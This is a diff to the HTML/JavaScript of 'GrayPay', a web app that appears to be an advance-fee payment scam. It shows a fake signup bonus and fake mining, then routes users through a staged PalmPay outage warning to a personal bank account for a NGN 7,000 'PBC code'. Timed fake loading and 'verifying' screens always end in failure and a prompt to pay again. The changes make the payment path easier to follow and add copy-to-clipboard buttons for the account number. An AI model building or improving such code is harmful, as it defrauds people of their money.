@@ -329,6 +329,31 @@
             margin-bottom: 15px;
         }
 
+        .copy-item {
+            background-color: #2a2a2a;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .copy-item:hover {
+            background-color: #3a3a3a;
+        }
+
+        .copy-text {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .copy-icon {
+            color: #10b981;
+            font-size: 14px;
+        }
+
         .text-center { text-align: center; }
         .mt-20 { margin-top: 20px; }
         .mb-20 { margin-bottom: 20px; }
@@ -348,7 +373,7 @@
 <body>
 <div class="app-container">
     <!-- WELCOME SCREEN -->
-    <div id="welcomeScreen" class="screen active">
+    <div id="welcomeScreen" class="screen">
         <div class="header">
             <div></div>
             <button class="help-btn" onclick="showHelpOptions()">❓ You Need Help?</button>
@@ -471,12 +496,22 @@
     function openWhatsApp() { window.open('https://wa.me/2348168909003', '_blank'); }
 
     // ========== SCREEN NAVIGATION ==========
-    function showScreen(screenId) {
+    function showScreen(screenId, saveToHistory = true) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById(screenId).classList.add('active');
+        let screenElement = document.getElementById(screenId);
+        if (screenElement) {
+            screenElement.classList.add('active');
+            if (saveToHistory && currentUser) {
+                localStorage.setItem('graypay_last_screen', screenId);
+            }
+        }
     }
 
-    function showWelcome() { showScreen('welcomeScreen'); }
+    function showWelcome() { 
+        showScreen('welcomeScreen');
+        localStorage.removeItem('graypay_last_screen');
+    }
+    
     function showSignup() { showScreen('signupScreen'); }
     function showLogin() { showScreen('loginScreen'); }
 
@@ -492,6 +527,35 @@
         if (!currentUser) return;
         updateDashboard();
         showScreen('dashboardScreen');
+    }
+
+    // ========== AUTO LOGIN & RESTORE SCREEN ON REFRESH ==========
+    function autoLoginAndRestore() {
+        let savedUserEmail = localStorage.getItem('graypay_current_user');
+        if (savedUserEmail) {
+            let user = users.find(u => u.email === savedUserEmail);
+            if (user) {
+                currentUser = user;
+                let lastScreen = localStorage.getItem('graypay_last_screen');
+                if (lastScreen && document.getElementById(lastScreen)) {
+                    showScreen(lastScreen);
+                } else {
+                    showDashboard();
+                }
+                return true;
+            }
+        }
+        showWelcome();
+        return false;
+    }
+
+    function saveCurrentUserSession(email) {
+        localStorage.setItem('graypay_current_user', email);
+    }
+
+    function clearUserSession() {
+        localStorage.removeItem('graypay_current_user');
+        localStorage.removeItem('graypay_last_screen');
     }
 
     // ========== SIGNUP ==========
@@ -526,12 +590,12 @@
             miningActive: false,
             miningEndTime: null,
             hasSeenBonus: false,
-            hasPBC: false,
             transactions: [{ type: 'Bonus', amount: 200000, date: new Date().toLocaleString(), status: 'Success' }]
         };
         users.push(newUser);
         saveUsers();
         currentUser = newUser;
+        saveCurrentUserSession(email);
         
         showDashboard();
         
@@ -552,6 +616,7 @@
             return;
         }
         currentUser = user;
+        saveCurrentUserSession(email);
         showDashboard();
     }
 
@@ -587,6 +652,7 @@
             <button class="btn btn-primary" onclick="logout()">Log Out</button>
         `;
         document.querySelector('.app-container').appendChild(profileDiv);
+        localStorage.setItem('graypay_last_screen', 'profileView');
     }
 
     function goBackToDashboard() {
@@ -600,11 +666,12 @@
 
     function logout() {
         currentUser = null;
+        clearUserSession();
         goBackToDashboard();
         showWelcome();
     }
 
-    // ========== WITHDRAW PAGE (with minimum withdrawal display) ==========
+    // ========== WITHDRAW PAGE ==========
     function showWithdrawPage() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -633,6 +700,7 @@
             <button class="btn btn-primary" onclick="processWithdraw()">Submit</button>
         `;
         document.querySelector('.app-container').appendChild(withdrawDiv);
+        localStorage.setItem('graypay_last_screen', 'withdrawView');
     }
 
     function processWithdraw() {
@@ -674,6 +742,7 @@
             <button class="btn btn-primary" onclick="processAirtime()">Buy Airtime</button>
         `;
         document.querySelector('.app-container').appendChild(airtimeDiv);
+        localStorage.setItem('graypay_last_screen', 'airtimeView');
     }
 
     function processAirtime() {
@@ -722,6 +791,7 @@
             <button class="btn btn-primary" onclick="processData()">Buy Data</button>
         `;
         document.querySelector('.app-container').appendChild(dataDiv);
+        localStorage.setItem('graypay_last_screen', 'dataView');
     }
 
     function processData() {
@@ -745,7 +815,7 @@
         });
     }
 
-    // ========== BUY PBC FULL FLOW (as you requested) ==========
+    // ========== BUY PBC FULL FLOW ==========
     function showBuyPBC() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -767,6 +837,7 @@
             <button id="payBtnPBC" class="btn btn-disabled" disabled onclick="processPBCStep1()">Pay</button>
         `;
         document.querySelector('.app-container').appendChild(pbcDiv);
+        localStorage.setItem('graypay_last_screen', 'pbcView');
         
         let nameInp = document.getElementById('fullNamePBC');
         let emailInp = document.getElementById('emailPBC');
@@ -784,14 +855,12 @@
         emailInp.addEventListener('input', checkFields);
     }
 
-    // Step 1: 10 seconds loading after clicking Pay
     function processPBCStep1() {
         showLoading('Processing your request...', 10000, () => {
             showPalmPayWarning();
         });
     }
 
-    // Step 2: PalmPay Service Down warning screen
     function showPalmPayWarning() {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         
@@ -810,14 +879,29 @@
                 <p>Please do not use PalmPay for payments at this time.</p>
                 <p>The PalmPay service is currently experiencing issues. Please use other supported banks for your payment.</p>
             </div>
-            <button class="btn btn-primary" onclick="showBankTransfer()">Proceed to Bank Transfer</button>
-            <button class="btn" onclick="goBackToDashboard()">I Understand</button>
+            <button class="btn btn-primary" onclick="proceedToBankTransfer()">Proceed to Bank Transfer</button>
+            <button class="btn" onclick="proceedToBankTransfer()">I Understand</button>
         `;
         document.querySelector('.app-container').appendChild(warningDiv);
+        localStorage.setItem('graypay_last_screen', 'palmPayWarningView');
     }
 
-    // Step 3: Bank Transfer page with account details
-    function showBankTransfer() {
+    function proceedToBankTransfer() {
+        showLoading('Processing...', 5000, () => {
+            showBankDetailsPage();
+        });
+    }
+
+    function copyToClipboard(text, element) {
+        navigator.clipboard.writeText(text);
+        let originalText = element.innerHTML;
+        element.innerHTML = text + ' ✅ Copied!';
+        setTimeout(() => {
+            element.innerHTML = originalText;
+        }, 2000);
+    }
+
+    function showBankDetailsPage() {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         
         let bankDiv = document.createElement('div');
@@ -831,26 +915,29 @@
                 <button class="help-btn" onclick="showHelpOptions()">❓ You Need Help?</button>
             </div>
             <h2>Bank Transfer</h2>
-            <div class="info-box">
-                <p><strong>Amount:</strong> NGN 7,000</p>
-                <p><strong>Account Number:</strong> 2778715377</p>
-                <p><strong>Bank Name:</strong> Paga</p>
-                <p><strong>Account Name:</strong> Ahmed Isah</p>
+            <div class="copy-item" onclick="copyToClipboard('7000', this.querySelector('.copy-text'))">
+                <span class="copy-text"><strong>Amount:</strong> NGN 7,000</span>
+                <span class="copy-icon">📋 Copy</span>
             </div>
+            <div class="copy-item" onclick="copyToClipboard('2778715377', this.querySelector('.copy-text'))">
+                <span class="copy-text"><strong>Account Number:</strong> 2778715377</span>
+                <span class="copy-icon">📋 Copy</span>
+            </div>
+            <div class="info-box"><strong>Bank Name:</strong> Paga</div>
+            <div class="info-box"><strong>Account Name:</strong> Ahmed Isah</div>
             <p class="text-center mb-10">Transfer the exact amount to the account above.<br>Your PBC code will be generated automatically after payment confirmation.<br>Use your registered name as the transfer description for faster processing.</p>
-            <button class="btn btn-primary" onclick="showIHavePaid()">I have made this bank transfer</button>
+            <button class="btn btn-primary" onclick="processIHavePaid()">I have made this bank transfer</button>
         `;
         document.querySelector('.app-container').appendChild(bankDiv);
+        localStorage.setItem('graypay_last_screen', 'bankTransferView');
     }
 
-    // Step 4: "I have paid" button - 20 seconds loading
-    function showIHavePaid() {
+    function processIHavePaid() {
         showLoading('Verifying your payment. Please wait while we confirm your bank transfer...', 20000, () => {
             showVerificationFailed();
         });
     }
 
-    // Step 5: Transaction verification failed screen
     function showVerificationFailed() {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         
@@ -868,10 +955,11 @@
                 <h2>Transaction verification failed!</h2>
                 <p>Your payment could not be completed. Reason: No Payment received from you / invalid payment method.</p>
             </div>
-            <button class="btn btn-primary" onclick="showBankTransfer()">Try Again</button>
+            <button class="btn btn-primary" onclick="showBankDetailsPage()">Try Again</button>
             <button class="btn" onclick="showHelpOptions()">❓ You Need Help?</button>
         `;
         document.querySelector('.app-container').appendChild(failedDiv);
+        localStorage.setItem('graypay_last_screen', 'failedView');
     }
 
     // ========== MINING ==========
@@ -923,6 +1011,7 @@
             ${historyHtml || '<div class="text-center">No transactions yet</div>'}
         `;
         document.querySelector('.app-container').appendChild(historyDiv);
+        localStorage.setItem('graypay_last_screen', 'historyView');
     }
 
     // ========== HELP & LOADING ==========
@@ -940,6 +1029,9 @@
     }
 
     function switchTab(tab) { alert(`Switched to ${tab} tab`); }
+
+    // ========== INITIALIZE ==========
+    autoLoginAndRestore();
 </script>
 </body>
 </html>
